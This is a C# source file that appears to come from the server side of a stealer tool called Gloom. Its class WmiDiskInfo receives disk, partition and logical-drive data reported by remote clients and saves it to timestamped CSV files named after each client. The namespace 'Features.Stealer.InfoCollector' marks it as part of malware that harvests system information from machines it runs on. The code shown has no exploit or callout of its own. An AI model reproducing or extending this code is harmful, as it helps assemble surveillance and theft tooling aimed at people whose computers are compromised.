using CsvHelper;
using Gloom.WmiOps;
using Serilog;
using System.Globalization;
using System.Text;

namespace Gloom.Server.Features.Stealer.InfoCollector.Wmi;
internal class WmiDiskInfo : WmiInfo
{
	public WmiDiskInfo() : base("dsk", WmiOpCodes.DiskInfo)
	{
	}

	public override async Task Handle(string from, byte[] data)
	{
		var rsp = StructConvert.Bytes2Struct<DiskInfoResponse>(data);
		var fileName = $"Disk information of {from.Replace(':', '#')} at {DateTime.Now:yyyy-MM-dd-HH-mm-ss-ffff}.csv";
		try
		{
			using var fw = new StreamWriter(fileName, false, new UTF8Encoding(false), 8192);

			fw.WriteLine("Disk/Drives:");
			using (var csv = new CsvWriter(fw, CultureInfo.InvariantCulture, true))
				await csv.WriteRecordsAsync(rsp.DiskDrives);

			fw.WriteLine("Disk Partitions:");
			using (var csv = new CsvWriter(fw, CultureInfo.InvariantCulture, true))
				await csv.WriteRecordsAsync(rsp.DiskPartitions);

			fw.WriteLine("Logical Disks:");
			using (var csv = new CsvWriter(fw, CultureInfo.InvariantCulture, true))
				await csv.WriteRecordsAsync(rsp.LogicalDisks);

			Log.Information("Disk info of {client} written to {path}.", from, fileName);
		}
		catch (Exception ex)
		{
			Log.Error(ex, "Exception during handling of wmi disk info response.");
		}
	}
}
